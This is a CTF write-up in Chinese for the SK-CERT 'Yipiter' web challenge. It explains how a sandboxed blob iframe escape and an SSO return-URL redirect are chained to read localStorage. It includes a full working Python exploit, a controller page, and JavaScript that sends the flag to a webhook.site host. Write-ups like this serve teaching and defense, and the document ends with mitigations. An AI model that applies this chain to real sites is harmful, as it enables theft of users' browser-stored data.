# Yipiter — Blob URL Sandbox 逃逸 + SSO 重定向窃取 localStorage 完整 Writeup

> CTF: CyberGame 2026 (SK-CERT) | 难度: Medium | 题目名: Yipiter
>
> 题目来源: `http://46.62.153.171:5555`
>
> Flag: `SK-CERT{sneks_bite_but_jsneks_bite_harder}`

**题目分类：Web 安全**。本题考察的是 **iframe sandbox 机制理解** + **blob URL origin 继承** + **SSO 回调重定向** + **localStorage 窃取** 的组合利用。

这道题的核心思路可以用一句话概括：**我们让 Bot 的浏览器执行一段 JavaScript，这段 JS 从 localStorage 里读出 flag 并发送给我们。** 难点在于，JS 被关在一个"沙箱"里，需要经过一系列巧妙的逃逸步骤才能读取 localStorage。

---

## 目录

- [第一章：你需要先知道的知识](#第一章你需要先知道的知识)
- [第二章：这道题是什么结构](#第二章这道题是什么结构)
- [第三章：Bot 的工作流程——flag 是怎么存进去的](#第三章bot-的工作流程flag-是怎么存进去的)
- [第四章：寻找攻击入口——我们能控制什么](#第四章寻找攻击入口我们能控制什么)
- [第五章：sandbox 沙箱——我们的敌人](#第五章sandbox-沙箱我们的敌人)
- [第六章：blob URL——沙箱逃逸的钥匙](#第六章blob-url沙箱逃逸的钥匙)
- [第七章：SSO 回调——把 blob URL 变成顶级页面](#第七章sso-回调把-blob-url-变成顶级页面)
- [第八章：完整攻击链复现](#第八章完整攻击链复现)
- [第九章：最终 Exploit 脚本](#第九章最终-exploit-脚本)
- [第十章：如何防御这类攻击](#第十章如何防御这类攻击)
- [第十一章：总结](#第十一章总结)

---

## 第一章：你需要先知道的知识

在讲这道题之前，先理解几个核心概念。如果你已经懂了可以跳过。

### 1.1 什么是 localStorage（本地存储）

`localStorage` 是浏览器提供的一种在用户电脑上存储数据的方式。你可以把它想象成一个"装在浏览器里的小数据库"。

```javascript
// 存数据
localStorage.setItem('username', 'alice');

// 取数据
var name = localStorage.getItem('username');  // 'alice'
```

**关键特性**：
- 数据按**域名**隔离。`http://example.com` 的 localStorage 和 `http://other.com` 的 localStorage 是完全分开的。
- 只有**同源**（相同协议+域名+端口）的页面才能读写。
- 数据会持久保存，关闭浏览器再打开还在。

**在这道题中**：flag 就存在 `http://challenge:4173` 这个域名的 localStorage 里。

### 1.2 什么是 iframe sandbox（沙箱框架）

网页中可以用 `<iframe>` 标签嵌入另一个网页。比如：

```html
<iframe src="http://example.com"></iframe>
```

正常情况下，iframe 里的页面和父页面可以互相访问（如果同源的话）。为了安全，HTML5 引入了 `sandbox` 属性，可以**限制** iframe 内页面的能力：

```html
<!-- 最严格的 sandbox：什么都不允许 -->
<iframe sandbox src="..."></iframe>

<!-- 允许执行脚本 + 允许打开弹窗 -->
<iframe sandbox="allow-scripts allow-popups" src="..."></iframe>
```

**sandbox 的常见权限标志**：

| 标志 | 允许什么 |
|------|---------|
| `allow-scripts` | 允许执行 JavaScript |
| `allow-popups` | 允许用 `window.open()` 打开新窗口 |
| `allow-same-origin` | 允许保持原始域名身份（能访问 localStorage 等） |
| `allow-popups-to-escape-sandbox` | 允许弹窗脱离沙箱 |

**关键点**：如果 sandbox 里**没有** `allow-same-origin`，iframe 内的页面会被视为"没有身份"（叫作 **opaque origin**，不透明来源），**无法访问 localStorage**。

**在这道题中**：我们的恶意 JavaScript 被放在 `sandbox="allow-scripts allow-popups"` 的 iframe 里——能执行代码、能开弹窗，但**不能读 localStorage**。这正是这道题最核心的障碍。

### 1.3 什么是 blob URL（二进制大对象网址）

当 JavaScript 在网页中创建了一些 HTML 内容，可以用 Blob 把它变成一个"虚拟的网页地址"：

```javascript
// 创建一段 HTML 内容
var html = '<h1>Hello World</h1><script>alert(1)</script>';

// 把 HTML 包装成一个 Blob 对象
var blob = new Blob([html], { type: 'text/html' });

// 生成一个虚拟 URL，浏览器可以直接访问它
var url = URL.createObjectURL(blob);
// url 的样子类似: blob:http://example.com/550e8400-e29b-41d4-a716-446655440000
```

**关键特性**：
- blob URL 的格式是 `blob:<原始域名>/<随机UUID>`
- 它继承创建者的域名。如果页面在 `http://challenge:4173` 上创建的 blob，那这个 blob URL 的域名也是 `http://challenge:4173`
- **当 blob URL 在 iframe 中加载时**，它受 iframe 的 sandbox 约束
- **当 blob URL 作为独立页面（顶级页面）直接打开时**，没有 sandbox 约束，拥有完整的域名权限

> 💡 **打个比方**：blob URL 就像一张"身份证复印件"。在正常情况下，复印件能证明你的身份（同源）。但如果有人给你套上了"限制服"（sandbox without allow-same-origin），这张复印件就失效了。而如果你**脱掉限制服**（作为顶级页面加载），复印件又能用了。

**在这道题中**：这个特性就是逃逸 sandbox 的关键！

### 1.4 什么是 postMessage（跨窗口通信）

不同域名的网页之间是不能直接对话的（这是浏览器的安全规则）。但 `postMessage` 是浏览器提供的一个"合法的跨域通信管道"：

```javascript
// 在 A 页面（发送方）
window.opener.postMessage({ msg: 'hello' }, '*');

// 在 B 页面（接收方）
window.addEventListener('message', function(event) {
    console.log('收到消息:', event.data);  // { msg: 'hello' }
});
```

`postMessage` 不受跨域限制——即使两个页面域名完全不同，也能用这种方式传递数据。

**在这道题中**：sandboxed iframe 里的 JS 利用 `postMessage` 把 blob URL 传给外部控制器页面。

### 1.5 什么是 window.open 和 opener

```javascript
// 页面 A 打开页面 B
var popup = window.open('http://example.com', 'popup_name');

// 页面 B 中可以通过 window.opener 访问页面 A
window.opener.postMessage('hello', '*');
```

`window.opener` 是浏览器提供的一个引用，指向"打开我的那个页面"。新窗口（popup）可以通过它和原窗口通信。

**在这道题中**：控制器页面打开弹窗加载 challenge 应用，sandboxed iframe 里的 JS 通过 `top.opener` 找回控制器页面。

---

## 第二章：这道题是什么结构

### 2.1 应用架构

这道题部署了三个 Docker 容器：

```
┌─────────────────────────────────────────────┐
│              nginx (端口 5555)               │
│              反向代理，把请求转发给后端       │
├──────────────────┬──────────────────────────┤
│   /bot/* 请求     │   其他所有请求            │
│       ↓           │         ↓                │
│   Bot 容器        │   App 容器               │
│   (Puppeteer)     │   (SvelteKit SPA)        │
│   端口 3000       │   端口 4173               │
└──────────────────┴──────────────────────────┘
```

- **App 容器**：一个类似 Jupyter Notebook 的网页应用，用 SvelteKit 构建。用户可以创建代码单元格，代码由 **Pyodide**（Python 的 WebAssembly 版本）在浏览器中执行。所有数据（用户账号、笔记本内容）都存在**浏览器的 localStorage** 中，没有任何后端数据库。
- **Bot 容器**：一个 Puppeteer（无头 Chrome 浏览器）程序。当你向 `/bot/visit` 发送一个 URL 时，Bot 会用浏览器访问这个 URL，然后注册账号、执行代码、保存 flag。
- **nginx**：反向代理，把外部请求路由到对应的容器。

### 2.2 关键源码分析

#### Notebook 应用的核心——sandbox iframe

当笔记本中某个代码单元格的输出包含 HTML 时，应用会把它放在一个 **sandboxed iframe** 里显示：

```html
<!-- NotebookApp.svelte 第 716 行 -->
<iframe sandbox="allow-scripts allow-popups" 
        src="blob:http://challenge:4173/xxxxxxxx" 
        style="height:120px">
</iframe>
```

注意到 sandbox 只有 `allow-scripts` 和 `allow-popups`，**没有** `allow-same-origin`。这意味着 iframe 里的内容：
- ✅ 能执行 JavaScript
- ✅ 能打开弹窗
- ❌ **不能**访问 localStorage（因为缺少 `allow-same-origin`）

#### SSO（单点登录）回调功能

应用有一个未完成的 SSO 功能（`/auth/` 页面）。当 URL 包含 `sso=callback` 参数时：

```javascript
// auth/+page.svelte 第 61-82 行
function maybeHandleSsoCallback() {
    if (params.get('sso') !== 'callback') return false;
    const token = params.get('token');
    if (!token) { error = 'SSO callback validation failed.'; return true; }
    
    // 创建一个 sso-demo 用户
    if (!users['sso-demo']) {
        users['sso-demo'] = { password: '__sso__', notebooks: {} };
        saveUsers(users);
    }
    localStorage.setItem(SESSION_KEY, 'sso-demo');
    redirectAfterAuth();  // ← 重定向到 return 参数指定的 URL
    return true;
}
```

关键函数 `getSafeReturnTarget`（决定重定向到哪）：

```javascript
function getSafeReturnTarget() {
    const searchParams = new URLSearchParams(window.location.search);
    const candidates = [searchParams.get('return'), getReturnCandidateFromHash()];
    for (const candidate of candidates) {
        if (!candidate) continue;
        try {
            const parsed = new URL(candidate, window.location.origin);
            // 只允许重定向到同源的 URL
            if (parsed.origin === window.location.origin) return parsed.toString();
        } catch {}
    }
    return new URL('/', window.location.origin).toString();
}
```

它会检查 `return` 参数的 URL 是否和当前页面**同源**。只有同源才允许重定向。

**关键洞察**：`new URL('blob:http://challenge:4173/uuid').origin` 的返回值是 `'http://challenge:4173'`——blob URL 继承了创建者的域名！所以 **blob URL 会通过同源检查**！

---

## 第三章：Bot 的工作流程——flag 是怎么存进去的

理解 Bot 的执行顺序至关重要，因为我们需要让恶意 JS 在 Bot 保存 flag 之后还能读取到它。

Bot 的代码（简化版）：

```javascript
// server.js
app.post('/visit', async (req, res) => {
    const { url } = req.body;  // 用户提供的 URL

    // ─── 第一步：用 firstPage 访问用户的 URL ───
    const firstPage = await browser.newPage();
    await firstPage.goto(url, { timeout: 10000, waitUntil: 'networkidle2' });
    await new Promise(resolve => setTimeout(resolve, 3000));  // 等 3 秒
    await firstPage.close();  // 关闭第一个页面

    // ─── 第二步：用 secondPage 注册账号并保存 flag ───
    const secondPage = await browser.newPage();
    const username = `ctf_${randomSuffix()}`;  // 随机用户名
    const password = 'ctfpass123';

    await registerAndLogin(secondPage, username, password);  // 注册并登录
    await runAndSaveFlagCell(secondPage, FLAG);  // 运行 print(FLAG) 并保存笔记本

    await secondPage.close();
    await browser.close();  // 关闭整个浏览器
});
```

时间线（关键！）：

```
t = 0s     Bot 访问我们提供的 URL（firstPage）
t = ~2s    页面加载完成（networkidle2）
t = ~5s    firstPage 被关闭
           ↓ 但 firstPage 打开的弹窗（popup）仍然存活！
t = ~5s    Bot 创建 secondPage
t = ~8s    注册新用户 ctf_xxxxxxxx
t = ~10s   登录成功
t = ~12s   执行 print("SK-CERT{真正的flag}") 并保存到 localStorage
           ↓ localStorage 里现在有 flag 了！
t = ~13s   secondPage 关闭
t = ~13s   整个浏览器关闭（所有弹窗也被关闭）
```

**核心要点**：
1. Bot **先**访问我们的 URL，**后**保存 flag
2. 我们的代码需要"活着"，等到 flag 被保存后再读取
3. firstPage 关闭时，弹窗不会关闭——它们会继续存活直到浏览器关闭

---

## 第四章：寻找攻击入口——我们能控制什么

攻击者能控制的东西：

### 4.1 Bot 访问的 URL

我们可以让 Bot 访问任何 `http://` 或 `https://` URL。这意味着我们可以让 Bot 打开我们控制的页面。

### 4.2 Notebook 数据导入

如果 Bot 访问 `http://challenge:4173/new/?url=<某个URL>`，应用会从该 URL 下载一个 notebook JSON 文件并加载它。我们可以控制这个 JSON 的内容。

一个 notebook JSON 的结构：

```json
{
    "nbformat": 4,
    "metadata": {"name": "我的笔记本"},
    "cells": [
        {
            "cell_type": "code",
            "source": "print('hello')",
            "outputs": [
                {
                    "output_type": "display_data",
                    "data": {
                        "text/html": "<h1>我们控制的 HTML 内容！</h1>"
                    }
                }
            ]
        }
    ]
}
```

`outputs` 字段是预计算的输出结果。我们可以在 `text/html` 里放**任意 HTML 和 JavaScript**。应用会把这段 HTML 放进 sandboxed blob iframe 里渲染。

### 4.3 攻击思路

```
我们的目标：在 challenge 域名下执行 JS → 读取 localStorage → 获取 flag

障碍：JS 在 sandboxed iframe 里 → 不能读 localStorage

解决方案：??? （接下来两章详细讲解）
```

---

## 第五章：sandbox 沙箱——我们的敌人

让我们更深入理解 sandbox 的限制。

### 5.1 sandbox 里能做什么

```
✅ 执行 JavaScript（因为有 allow-scripts）
✅ 用 window.open() 打开新窗口（因为有 allow-popups）
✅ 发送网络请求（fetch、Image beacon）
✅ 用 postMessage 通信
```

### 5.2 sandbox 里不能做什么

```
❌ 读取 localStorage（因为没有 allow-same-origin）
❌ 访问父页面的 DOM（跨域隔离）
❌ 让弹窗脱离沙箱（因为没有 allow-popups-to-escape-sandbox）
```

### 5.3 "不能读 localStorage"到底意味着什么

在 sandboxed iframe 里尝试读 localStorage：

```javascript
try {
    var data = localStorage.getItem('yipiii.users.v1');
} catch (e) {
    // 抛出 SecurityError: Blocked a frame with origin "null" 
    // from accessing a cross-origin frame.
}
```

因为 sandbox 没有 `allow-same-origin`，iframe 的域名变成了 `null`（不透明来源）。而 localStorage 是按域名隔离的，`null` 域名和 `http://challenge:4173` 是不同的域名，所以读不了。

### 5.4 弹窗也继承沙箱

从 sandboxed iframe 用 `window.open()` 打开的弹窗，也会**继承** sandbox 的限制。所以弹窗的域名也是 `null`，也读不了 localStorage。

这就是为什么简单的弹窗方案行不通。

---

## 第六章：blob URL——沙箱逃逸的钥匙

现在开始讲这道题最精妙的技巧。

### 6.1 blob URL 的双重生命

blob URL 有一个神奇的性质：**同一个 blob URL，在不同的上下文中加载，行为完全不同**。

**场景 A：在 iframe 中加载（受 sandbox 约束）**

```html
<!-- 父页面在 http://challenge:4173 -->
<iframe sandbox="allow-scripts allow-popups" 
        src="blob:http://challenge:4173/xxxxxxxx">
</iframe>
```

结果：
- iframe 的域名 = `null`（被 sandbox 强制）
- 不能读 localStorage ❌

**场景 B：作为顶级页面加载（不受任何 sandbox 约束）**

```
浏览器地址栏直接输入: blob:http://challenge:4173/xxxxxxxx
或者: window.location = 'blob:http://challenge:4173/xxxxxxxx'
```

结果：
- 页面的域名 = `http://challenge:4173`（blob URL 继承创建者域名）
- 没有 sandbox 属性，不受任何限制
- **可以读 localStorage** ✅

> 💡 **为什么？** 因为 sandbox 是 `<iframe>` 标签的属性，不是 blob URL 本身的属性。当 blob URL 在 iframe 里时，iframe 标签的 sandbox 约束了它。但当 blob URL 作为独立页面加载时，没有 iframe 包裹它，就没有 sandbox 了。

### 6.2 逃逸思路

```
1. 在 sandboxed iframe 里运行 JS
2. JS 拿到自己的 blob URL（通过 location.href）
3. 想办法让浏览器把这个 blob URL 作为顶级页面加载
4. 一旦作为顶级页面加载，sandbox 消失，就能读 localStorage 了！
```

问题：怎么让浏览器以顶级页面方式加载 blob URL？

答案：利用 SSO 回调的重定向功能！

---

## 第七章：SSO 回调——把 blob URL 变成顶级页面

### 7.1 SSO 回调的重定向机制

回顾 SSO 回调的代码：

```javascript
// 访问: http://challenge:4173/auth/?sso=callback&token=anything&return=<URL>
// 效果:
// 1. 创建 sso-demo 用户
// 2. 设置登录状态
// 3. 重定向到 return 参数指定的 URL
redirectAfterAuth();
```

`redirectAfterAuth()` 调用 `getSafeReturnTarget()`，后者检查 `return` URL 是否同源：

```javascript
const parsed = new URL(candidate, window.location.origin);
if (parsed.origin === window.location.origin) return parsed.toString();
```

### 7.2 blob URL 通过同源检查

当 `return` 参数是一个 blob URL 时：

```javascript
var parsed = new URL('blob:http://challenge:4173/xxxxxxxx');
console.log(parsed.origin);  // 输出: "http://challenge:4173"

var locationOrigin = 'http://challenge:4173';
console.log(parsed.origin === locationOrigin);  // 输出: true ✅
```

**blob URL 的 origin 继承自创建者**。因为 blob 是在 `http://challenge:4173` 上创建的，所以它的 origin 就是 `http://challenge:4173`。同源检查通过！

### 7.3 完整逃逸流程

```
┌──────────────────────────────────────────────────────────────────┐
│ 步骤 1：控制器页面（我们控制的外部网页）                          │
│                                                                  │
│   window.open(                                                   │
│     'http://challenge:4173/new/?url=<恶意notebook的URL>',        │
│     'seed'                                                      │
│   );                                                             │
│                                                                  │
│   → 打开一个弹窗，加载 challenge 应用并导入我们的 notebook       │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ 步骤 2：challenge 应用在弹窗中加载                               │
│                                                                  │
│   应用下载我们的 notebook JSON                                   │
│   notebook 中的 HTML 输出被放在 sandboxed blob iframe 中渲染     │
│                                                                  │
│   <iframe sandbox="allow-scripts allow-popups"                  │
│           src="blob:http://challenge:4173/abc123">               │
│   </iframe>                                                      │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ 步骤 3：sandboxed iframe 中的恶意 JS 执行                        │
│                                                                  │
│   // JS 检测到自己在一个 iframe 中                               │
│   if (window.top !== window) {                                   │
│       // 拿到 blob URL                                           │
│       var blobUrl = location.href;                               │
│       // blobUrl = "blob:http://challenge:4173/abc123"          │
│                                                                  │
│       // 通过 postMessage 把 blob URL 发给控制器页面             │
│       top.opener.postMessage(                                    │
│           { t: 'blob_leak', href: blobUrl },                     │
│           '*'                                                    │
│       );                                                         │
│   }                                                              │
└────────────────────────────┬─────────────────────────────────────┘
                             │ postMessage
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ 步骤 4：控制器页面收到 blob URL                                  │
│                                                                  │
│   window.addEventListener('message', function(ev) {             │
│       var blobUrl = ev.data.href;                                │
│                                                                  │
│       // 构造 SSO 回调 URL，return 参数设为 blob URL             │
│       var ssoUrl = 'http://challenge:4173/auth/'                 │
│           + '?sso=callback&mode=login&token=x'                   │
│           + '&return=' + encodeURIComponent(blobUrl);            │
│                                                                  │
│       // 打开 SSO 回调页面                                       │
│       window.open(ssoUrl, '_blank', 'noopener');                 │
│   });                                                            │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ 步骤 5：SSO 回调处理                                             │
│                                                                  │
│   1. 创建 sso-demo 用户                                         │
│   2. 检查 return=blob:http://challenge:4173/abc123               │
│   3. new URL(blobUrl).origin === 'http://challenge:4173' → 通过!│
│   4. 重定向到 blob URL                                           │
│                                                                  │
│   window.location.assign('blob:http://challenge:4173/abc123')   │
└────────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│ 步骤 6：blob URL 作为顶级页面加载！                              │
│                                                                  │
│   ✅ 没有 sandbox！（因为不是在 iframe 里了）                     │
│   ✅ origin = http://challenge:4173（blob 继承创建者域名）        │
│   ✅ 可以访问 localStorage！                                     │
│                                                                  │
│   // JS 再次执行，这次 window.top === window（是顶级页面）        │
│   if (window.top === window) {                                   │
│       // 每 500ms 轮询 localStorage                              │
│       setInterval(function() {                                   │
│           var users = localStorage.getItem('yipiii.users.v1');   │
│           var match = users.match(/SK-CERT\{[^}]+\}/);           │
│           if (match) {                                           │
│               // 找到 flag！发送到我们的服务器                    │
│               new Image().src = 'https://webhook.site/xxx/'      │
│                   + '?flag=' + match[0];                          │
│           }                                                      │
│       }, 500);                                                   │
│   }                                                              │
└──────────────────────────────────────────────────────────────────┘
```

### 7.4 时间线对齐

为什么轮询能等到 flag？看时间线：

```
t = 0s      Bot 访问控制器页面（firstPage）
t = 0.5s    控制器打开弹窗 → 加载 challenge → 导入 notebook
t = 2s      sandboxed iframe 中的 JS 执行 → 发送 blob URL
t = 2.5s    控制器收到 blob URL → 打开 SSO 回调
t = 3s      SSO 重定向到 blob URL → 顶级页面加载
t = 3.5s    顶级页面 JS 开始每 500ms 轮询 localStorage
            （此时 localStorage 里还没有 flag）
t = 5s      Bot 关闭 firstPage
            （弹窗和顶级 blob 页面仍然存活！）
t = 8s      Bot 在 secondPage 注册新用户
t = 12s     Bot 执行 print(FLAG) 并保存到 localStorage
            ↑ flag 现在在 localStorage 里了！
t = 12.5s   我们的轮询检测到 flag → 发送到 webhook ✅
t = 13s     Bot 关闭浏览器（一切结束）
```

关键：我们的 blob 顶级页面在 t=3.5s 就开始轮询了，而 flag 在 t=12s 才被保存。轮询每 500ms 一次，最多等 100 秒（200 次），完全来得及捕获 flag。

---

## 第八章：完整攻击链复现

### 8.1 需要的外部资源

1. **webhook.site**：一个免费的在线工具，可以接收 HTTP 请求并记录。我们用它来：
   - 托管恶意 notebook JSON
   - 接收 JS 发来的 flag

2. **httpbin.org/base64/**：一个在线工具，可以把 base64 编码的内容作为网页返回。我们用它来托管控制器页面。

### 8.2 逐步操作

#### 第一步：创建 webhook.site 令牌

访问 [webhook.site](https://webhook.site)，会自动获得一个唯一的 URL，类似 `https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`。

我们需要两个令牌：
- **日志令牌**：接收 JS 发来的数据（包括 flag）
- **Notebook 令牌**：托管恶意 notebook JSON 文件

#### 第二步：构造恶意 Notebook

```json
{
    "nbformat": 4,
    "nbformat_minor": 5,
    "metadata": {"name": "x", "yipiii": true},
    "cells": [{
        "cell_type": "code",
        "source": ["print('x')\n"],
        "execution_count": 1,
        "outputs": [{
            "output_type": "display_data",
            "data": {
                "text/html": "<script>这里是恶意 JS 代码</script>"
            }
        }]
    }]
}
```

恶意 JS 做两件事：
1. 如果在 iframe 中：通过 `postMessage` 把 blob URL 发出去
2. 如果在顶级页面中：轮询 localStorage 找 flag

将这个 JSON 上传到 Notebook 令牌的"默认响应内容"。

#### 第三步：构造控制器页面

```html
<!doctype html>
<html>
<body>
<script>
var C = 'http://challenge:4173';      // 内网地址
var N = 'https://webhook.site/...';    // Notebook 令牌的 URL
var W = 'https://webhook.site/...';    // 日志令牌的 URL

// 1. 打开 challenge 应用并导入 notebook
window.open(C + '/new/?url=' + encodeURIComponent(N), 'seed');

// 2. 监听来自 sandboxed iframe 的 postMessage
window.addEventListener('message', function(ev) {
    if (ev.data.t === 'blob_leak' && ev.data.href) {
        // 3. 收到 blob URL，打开 SSO 回调
        var ssoUrl = C + '/auth/?sso=callback&mode=login&token=x'
                   + '&return=' + encodeURIComponent(ev.data.href);
        window.open(ssoUrl, '_blank', 'noopener');
    }
});
</script>
</body>
</html>
```

将这个 HTML base64 编码，放到 httpbin.org/base64/ 上。

#### 第四步：让 Bot 访问控制器

```bash
curl -X POST http://46.62.153.171:5555/bot/visit \
  -H 'Content-Type: application/json' \
  -d '{"url": "https://httpbin.org/base64/<控制器页面的base64>"}'
```

#### 第五步：在日志 webhook 上看到 flag

几秒钟后，webhook.site 的日志页面会显示收到的请求，其中包含 `SK-CERT{sneks_bite_but_jsneks_bite_harder}`。

---

## 第九章：最终 Exploit 脚本

以下是完整的自动化 exploit 脚本，运行即可获取 flag：

```python
#!/usr/bin/env python3
"""
Yipiter SK-CERT CTF Exploit
攻击链: notebook HTML → sandboxed blob iframe → postMessage blob URL
       → SSO callback redirect → blob URL as top-level → read localStorage
"""
import json, base64, urllib.request, urllib.parse, time, sys, re

PUBLIC = 'http://46.62.153.171:5555'
INTERNAL = 'http://challenge:4173'       # Docker 内网地址
WH_BASE = 'https://webhook.site'
FLAG_RE = re.compile(r'SK-CERT\{[^}]+\}')

def http_json(method, url, body=None, timeout=20):
    data = None
    headers = {"Accept": "application/json"}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read().decode('utf-8', errors='replace')
    if not raw.strip(): return {}
    try: return json.loads(raw)
    except: return raw

def create_token(content="", ctype="application/json"):
    payload = {"default_status": 200, "default_content": content,
               "default_content_type": ctype, "cors": True}
    data = http_json("POST", f"{WH_BASE}/token", payload)
    return data.get("uuid")

def update_token(token, content, ctype="application/json"):
    payload = {"default_status": 200, "default_content": content,
               "default_content_type": ctype, "cors": True}
    http_json("PUT", f"{WH_BASE}/token/{token}", payload)

# ─── 创建 webhook 令牌 ──────────────────────────────────────
print("[1] 创建 webhook.site 令牌...")
log_token = create_token()
nb_token = create_token()
log_url = f"{WH_BASE}/{log_token}"
nb_url = f"{WH_BASE}/{nb_token}"

# ─── 构造恶意 notebook ──────────────────────────────────────
print("[2] 构造恶意 notebook...")
js_payload = "<script>" + f"""
(function(){{
var WH='{log_url}';
function S(t,d){{try{{(new Image()).src=WH+'/?t='+encodeURIComponent(t)+'&d='+encodeURIComponent(d||'')+'&_='+Date.now();}}catch(e){{}}}}
S('loaded',location.href+'|top='+(window.top===window));
if(window.top!==window){{
  try{{top.opener.postMessage({{t:'blob_leak',href:location.href}},'*');S('pm',location.href);}}catch(e){{S('pme',String(e));}}
  return;
}}
S('top','poll');
var LU=null;
function sn(){{
  try{{
    var u=localStorage.getItem('yipiii.users.v1')||'';
    var s=localStorage.getItem('yipiii.session.v1')||'';
    if(u!==LU){{LU=u;S('u',u.slice(0,3000));}}
    var m=(u+'\\n'+s).match(/SK-CERT\\{{[^}}]+\\}}/);
    if(m)S('flag',m[0]);
  }}catch(e){{S('lse',String(e));}}
}}
sn();var tk=0;
var iv=setInterval(function(){{tk++;sn();if(tk>200)clearInterval(iv);}},500);
}})();
""" + "</script>"

notebook = {
    "nbformat":4,"nbformat_minor":5,
    "metadata":{"name":"x","yipiii":True},
    "cells":[{"cell_type":"code","metadata":{},
              "source":["print('x')\\n"],"execution_count":1,
              "outputs":[{"output_type":"display_data",
                          "data":{"text/html":js_payload},"metadata":{}}]}]
}
update_token(nb_token, json.dumps(notebook, separators=(',',':')))
print("    Notebook 已上传到 webhook.site")

# ─── 构造控制器页面 ──────────────────────────────────────────
print("[3] 构造控制器页面...")
controller_html = f"""<!doctype html><html><body><script>
var W='{log_url}',C='{INTERNAL}',N='{nb_url}';
function P(t,d){{try{{new Image().src=W+'/?t='+encodeURIComponent(t)+'&d='+encodeURIComponent(d||'')+'&_='+Date.now();}}catch(e){{}}}}
P('cl','start');
try{{window.open(C+'/new/?url='+encodeURIComponent(N),'s');P('po','ok');}}catch(e){{P('pe',String(e));}}
window.addEventListener('message',function(e){{
  try{{
    if(!e.data||e.data.t!=='blob_leak'||!e.data.href)return;
    P('bl',e.data.href);
    var u=C+'/auth/?sso=callback&mode=login&token=x&return='+encodeURIComponent(e.data.href);
    window.open(u,'_blank','noopener');P('so','ok');
  }}catch(ex){{P('me',String(ex));}}
}});
</script></body></html>"""

b64 = base64.b64encode(controller_html.encode()).decode()
b64 = b64.replace('+','-').replace('/','_').rstrip('=')
ctrl_url = f'https://httpbin.org/base64/{b64}'
print(f"    控制器 URL: {ctrl_url[:60]}...")

# ─── 触发 Bot ───────────────────────────────────────────────
print("[4] 触发 Bot 访问...")
req = urllib.request.Request(
    PUBLIC + '/bot/visit',
    data=json.dumps({'url': ctrl_url}).encode(),
    headers={'Content-Type': 'application/json'},
    method='POST'
)
with urllib.request.urlopen(req, timeout=30) as resp:
    print(f"    Bot 响应: {resp.read().decode()[:100]}")

# ─── 等待 flag ──────────────────────────────────────────────
print("[5] 等待 flag...")
start = time.time()
while time.time() - start < 90:
    time.sleep(5)
    req2 = urllib.request.Request(
        f'{WH_BASE}/token/{log_token}/requests?sorting=newest&per_page=50',
        headers={'Accept': 'application/json'}
    )
    with urllib.request.urlopen(req2, timeout=10) as resp2:
        data = json.loads(resp2.read())
    for r in data.get('data', []):
        u = r.get('url', '')
        params = urllib.parse.parse_qs(urllib.parse.urlparse(u).query)
        val = params.get('d', [''])[0]
        m = FLAG_RE.search(val)
        if m:
            print(f"\n{'='*60}")
            print(f"FLAG: {m.group(0)}")
            print(f"{'='*60}")
            sys.exit(0)
    elapsed = int(time.time() - start)
    print(f"    [{elapsed}s] 等待中...")

print("未找到 flag")
```

---

## 第十章：如何防御这类攻击

| 防御措施 | 说明 |
|---------|------|
| **SSO 回调验证拒绝 blob URL** | `getSafeReturnTarget()` 应该检查 URL 协议是否为 `http` 或 `https`，拒绝 `blob:` 协议 |
| **iframe sandbox 添加更严格限制** | 如果不需要弹窗功能，移除 `allow-popups` |
| **Notebook 输出消毒** | 对 `text/html` 输出进行 HTML 消毒（sanitize），移除 `<script>` 标签 |
| **使用 srcdoc 替代 blob URL** | `srcdoc` 属性的 HTML 内容不会产生可导航的 URL，从根本上消除 blob URL 逃逸风险 |
| **CSP 策略** | 添加 `Content-Security-Policy` 限制脚本执行来源 |

---

## 第十一章：总结

这道题的精妙之处在于组合了三个看似无关的特性：

1. **iframe sandbox** 的限制看似无懈可击（不能读 localStorage）
2. **blob URL** 的 origin 继承看似只是个特性（不会造成安全问题）
3. **SSO 回调**的重定向看似很安全（有同源检查）

但当三者组合在一起时：

```
sandbox 限制 JS → JS 把 blob URL 传出去
→ SSO 回调接受 blob URL（因为 origin 匹配）
→ SSO 重定向到 blob URL 作为顶级页面
→ 顶级页面没有 sandbox → 可以读 localStorage → 拿到 flag
```

**核心教训**：安全不在于单个组件是否安全，而在于组件组合时是否产生意料之外的交互。blob URL 的 origin 继承 + SSO 的开放重定向 + sandbox 的绕过途径，三者单独看都不是漏洞，但组合在一起就形成了完整的攻击链。
